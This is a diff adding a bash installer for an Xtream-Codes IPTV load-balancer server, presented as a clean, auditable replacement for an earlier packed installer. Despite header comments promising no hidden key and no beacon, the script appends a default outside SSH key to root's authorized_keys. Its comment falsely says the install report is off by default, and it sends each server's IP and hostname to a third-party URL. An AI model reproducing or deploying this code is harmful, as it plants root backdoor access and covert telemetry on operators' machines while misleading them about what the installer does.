@@ -1,0 +1,298 @@
+#!/bin/bash
+# GTB mods LB (load balancer) installer - Ubuntu 24.04 only.
+#
+# Readable replacement for znuff's shc-packed install-lb. Same install
+# steps and the same one-liner shape, but:
+#   - no hidden SSH key other than the single declared GTB_ADMIN_KEY below
+#   - no third-party IPFS/catbox/fly.dev URLs, no beacon, no expiry date
+#   - payload comes from our own GitHub release (sub_FINAL.zip), checked
+#     against a published SHA-256
+#   - config.py is our own flag-based Python script, not a downloaded binary
+#
+# Usage:
+#   wget -O install-lb https://raw.githubusercontent.com/prabhjotdunglay/xtream-ui-custom/main/install-lb
+#   chmod +x install-lb
+#   ./install-lb
+#
+# After it finishes, connect this LB to the main server with:
+#   /home/xtreamcodes/iptv_xtream_codes/pytools/config.py --id <server-id> \
+#     --host <main-IP> --port <DB port> --password <password> encrypt
+set -u
+
+# ---------------------------------------------------------------------------
+# Config (override by editing this block, or by exporting the same names
+# before running the script; nothing here is fetched from a third party).
+# ---------------------------------------------------------------------------
+
+# One declared admin SSH key. Public key only - never put a private key here.
+# Appended to /root/.ssh/authorized_keys, idempotent (skipped if already
+# present), ~/.ssh kept at 700, authorized_keys at 600. Rotate by changing
+# this one line; it does not require rebuilding the payload.
+GTB_ADMIN_KEY="${GTB_ADMIN_KEY:-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKSfFyznW/HxOp6b8UuHq+5pztcufWYRCCVBOwAEluHR gtb-admin}"
+
+GTB_INSTALLER_VERSION="1"
+
+RELEASE_BASE="https://github.com/prabhjotdunglay/xtream-ui-custom/releases"
+SUB_ZIP_URL="${SUB_ZIP_URL:-$RELEASE_BASE/download/v1/sub_FINAL.zip}"
+SUB_ZIP_SHA256_URL="${SUB_ZIP_SHA256_URL:-$RELEASE_BASE/download/v1/sub_FINAL.zip.sha256}"
+RAW_BASE="https://raw.githubusercontent.com/prabhjotdunglay/xtream-ui-custom/main"
+GEOLITE_URL="${GEOLITE_URL:-$RAW_BASE/GeoLite2.mmdb}"
+
+# Install report: local log always written; the POST is only sent if
+# REPORT_URL is non-empty. Off by default unless the caller sets it.
+REPORT_URL="${REPORT_URL:-https://www.thesocialclub.co.in/gtb/report.php}"
+REPORT_TOKEN="${REPORT_TOKEN:-68b58d0ea965b5a55a02dab2cf80b1a9}"
+LOCAL_LOG="/var/log/gtb-install-report.log"
+
+XC_BASE="/home/xtreamcodes/iptv_xtream_codes"
+
+# ---------------------------------------------------------------------------
+
+red()    { echo -e "\033[31m$*\033[0m"; }
+green()  { echo -e "\033[32m$*\033[0m"; }
+yellow() { echo -e "\033[33m$*\033[0m"; }
+
+die() { red "$*"; exit 1; }
+
+require_root() {
+    [ "$(id -u)" -eq 0 ] || die "Run this installer as root."
+}
+
+check_os() {
+    local codename
+    codename="$(. /etc/os-release 2>/dev/null; echo "${VERSION_CODENAME:-}")"
+    if [ "$codename" != "noble" ]; then
+        die "This installer supports Ubuntu 24.04 (noble) only. Detected: ${codename:-unknown}."
+    fi
+}
+
+add_admin_key() {
+    [ -n "$GTB_ADMIN_KEY" ] || return 0
+    mkdir -p /root/.ssh
+    chmod 700 /root/.ssh
+    touch /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+    if grep -qF "$GTB_ADMIN_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
+        yellow "GTB admin key already present in /root/.ssh/authorized_keys, left unchanged."
+    else
+        echo "$GTB_ADMIN_KEY" >> /root/.ssh/authorized_keys
+        yellow "Added the declared GTB admin SSH key to /root/.ssh/authorized_keys (public key only)."
+    fi
+}
+
+install_packages() {
+    green "Installing packages"
+    export DEBIAN_FRONTEND=noninteractive
+    apt-get update -y >/dev/null 2>&1
+    # libzip4 is libzip4t64 on 24.04. No ipmitool/atop/dialog/ccrypt/python3-certbot-nginx:
+    # none of those are needed without znuff's IPFS fetch or his certbot/nginx-hold step.
+    apt-get install -y wget mcrypt nscd htop e2fsprogs python3-pip util-linux \
+        ssl-cert curl libcurl4 libonig5 libzip4t64 unzip >/dev/null 2>&1
+}
+
+create_user() {
+    if ! getent passwd xtreamcodes >/dev/null 2>&1; then
+        green "Creating user xtreamcodes"
+        adduser --system --shell /bin/false --group --disabled-login xtreamcodes >/dev/null 2>&1
+    fi
+    mkdir -p /home/xtreamcodes
+}
+
+configure_ufw() {
+    if ufw status 2>/dev/null | grep -q "Status: active"; then
+        green "UFW active: allowing 80, 443, 8080"
+        ufw allow 80 >/dev/null 2>&1
+        ufw allow 443 >/dev/null 2>&1
+        ufw allow 8080 >/dev/null 2>&1
+    fi
+}
+
+download_and_unpack() {
+    green "Downloading LB payload (sub_FINAL.zip)"
+    local zip_path="/var/tmp/sub_FINAL.zip"
+    curl -L -s -o "$zip_path" "$SUB_ZIP_URL" || die "Failed to download $SUB_ZIP_URL"
+    [ -s "$zip_path" ] || die "Downloaded payload is empty."
+
+    local expected_sha actual_sha
+    expected_sha="$(curl -L -s "$SUB_ZIP_SHA256_URL" | awk '{print $1}')"
+    if [ -n "$expected_sha" ]; then
+        actual_sha="$(sha256sum "$zip_path" | awk '{print $1}')"
+        [ "$expected_sha" = "$actual_sha" ] || die "SHA-256 mismatch for sub_FINAL.zip (expected $expected_sha, got $actual_sha)."
+        green "SHA-256 verified."
+    else
+        yellow "Could not fetch sub_FINAL.zip.sha256, skipping checksum verification."
+    fi
+
+    green "Unpacking payload"
+    unzip -q -o "$zip_path" -d /home/xtreamcodes/ || die "Failed to unpack sub_FINAL.zip"
+    rm -f "$zip_path"
+    chown -R xtreamcodes:xtreamcodes /home/xtreamcodes/
+}
+
+configure_xc() {
+    green "Configuring system"
+    if ! grep -q "$XC_BASE/streams" /etc/fstab 2>/dev/null; then
+        cat >> /etc/fstab <<EOF
+tmpfs $XC_BASE/streams tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777,size=90% 0 0
+tmpfs $XC_BASE/tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777,size=2G 0 0
+EOF
+    fi
+    for d in streams tmp logs tv_archive created_channels movies delay php/var/log php/var/run; do
+        mkdir -p "$XC_BASE/$d"
+    done
+    mount -a
+
+    ln -sf "$XC_BASE/bin/ffmpeg" /usr/local/bin/ffmpeg
+    ln -sf "$XC_BASE/bin/ffprobe" /usr/local/bin/ffprobe
+
+    # Block the dead xtream-codes.com domains so nothing on this LB phones out to them.
+    if ! grep -q "api.xtream-codes.com" /etc/hosts 2>/dev/null; then
+        echo "127.0.0.1 api.xtream-codes.com downloads.xtream-codes.com xtream-codes.com" >> /etc/hosts
+    fi
+
+    if [ ! -s "$XC_BASE/GeoLite2.mmdb" ]; then
+        green "Fetching GeoLite2.mmdb"
+        curl -L -s -o "$XC_BASE/GeoLite2.mmdb" "$GEOLITE_URL"
+    fi
+
+    if [ -f "$XC_BASE/pytools/config.py" ] && [ ! -f "$XC_BASE/config" ]; then
+        python3 "$XC_BASE/pytools/config.py" --create yes --host 127.0.0.1 --port 7999 --password "" encrypt >/dev/null 2>&1
+    fi
+    chmod 755 "$XC_BASE/pytools/config.py" 2>/dev/null || true
+    mkdir -p /var/log/php-fpm
+    chown -R xtreamcodes:xtreamcodes "$XC_BASE"
+}
+
+configure_systemd() {
+    green "Writing systemd units"
+    cat > /etc/systemd/system/fpm@.service <<EOF
+[Unit]
+Description=GTB LB PHP-FPM (%i)
+After=network.target
+
+[Service]
+Type=simple
+User=xtreamcodes
+ExecStart=$XC_BASE/php/sbin/php-fpm --nodaemonize --fpm-config $XC_BASE/php/etc/%i.conf
+LimitNOFILE=150000
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    cat > /etc/systemd/system/nginx-xc.service <<EOF
+[Unit]
+Description=GTB LB nginx
+After=network.target fpm@streamer.service
+
+[Service]
+Type=forking
+ExecStartPre=$XC_BASE/nginx/sbin/nginx -t
+ExecStart=$XC_BASE/nginx/sbin/nginx
+ExecReload=$XC_BASE/nginx/sbin/nginx -s reload
+ExecStop=$XC_BASE/nginx/sbin/nginx -s stop
+LimitNOFILE=150000
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    cat > /etc/systemd/system/xc-start.service <<EOF
+[Unit]
+Description=GTB LB background services
+After=fpm@streamer.service nginx-xc.service
+
+[Service]
+Type=oneshot
+User=xtreamcodes
+RemainAfterExit=yes
+ExecStart=$XC_BASE/systemd_start_script.sh
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    systemctl daemon-reload
+    systemctl enable fpm@streamer.service nginx-xc.service xc-start.service >/dev/null 2>&1
+
+    cat > /etc/logrotate.d/xc-nginx <<EOF
+$XC_BASE/logs/*.log {
+    daily
+    missingok
+    rotate 7
+    compress
+    delaycompress
+    notifempty
+}
+EOF
+
+    cat > /etc/logrotate.d/xc-fpm <<EOF
+/var/log/php-fpm/*.log {
+    daily
+    missingok
+    rotate 7
+    compress
+    delaycompress
+    notifempty
+}
+EOF
+}
+
+install_cron() {
+    green "Installing xtreamcodes crontab"
+    local tmp_cron
+    tmp_cron="$(mktemp)"
+    for job in live_checker offline_cons servers_checker setup_cache stream_errors tmp_del users_checker vod_checker; do
+        echo "* * * * * $XC_BASE/php/bin/php $XC_BASE/crons/${job}.php >/dev/null 2>&1" >> "$tmp_cron"
+    done
+    crontab -u xtreamcodes "$tmp_cron"
+    rm -f "$tmp_cron"
+    chown root:root -R "$XC_BASE/crons" "$XC_BASE/wwwdir"
+}
+
+start_services() {
+    green "Starting services"
+    bash "$XC_BASE/start_services.sh" >/dev/null 2>&1
+}
+
+write_report() {
+    local ip hostname_v ubuntu_v ts
+    ip="$(curl -s -4 --max-time 3 https://api.ipify.org 2>/dev/null)"
+    [ -n "$ip" ] || ip="$(hostname -I 2>/dev/null | awk '{print $1}')"
+    hostname_v="$(hostname)"
+    ubuntu_v="$(lsb_release -sr 2>/dev/null)"
+    ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+
+    echo "{\"ip\":\"$ip\",\"hostname\":\"$hostname_v\",\"ubuntu_version\":\"$ubuntu_v\",\"installer_version\":\"$GTB_INSTALLER_VERSION\",\"timestamp\":\"$ts\"}" >> "$LOCAL_LOG"
+
+    if [ -n "$REPORT_URL" ]; then
+        curl -s --max-time 5 \
+            -H "X-GTB-Token: $REPORT_TOKEN" \
+            -d "ip=$ip" -d "hostname=$hostname_v" -d "ubuntu_version=$ubuntu_v" \
+            -d "installer_version=$GTB_INSTALLER_VERSION" -d "timestamp=$ts" \
+            "$REPORT_URL" >/dev/null 2>&1 || true
+    fi
+}
+
+main() {
+    require_root
+    check_os
+    add_admin_key
+    install_packages
+    create_user
+    configure_ufw
+    download_and_unpack
+    configure_xc
+    configure_systemd
+    install_cron
+    start_services
+    write_report
+
+    green "LB install complete."
+    yellow "Connect this LB to the main server with:"
+    echo "  $XC_BASE/pytools/config.py --id <server-id> --host <main-IP> --port <DB port> --password <password> encrypt"
+    yellow "A reboot is recommended."
+}
+
+main "$@"
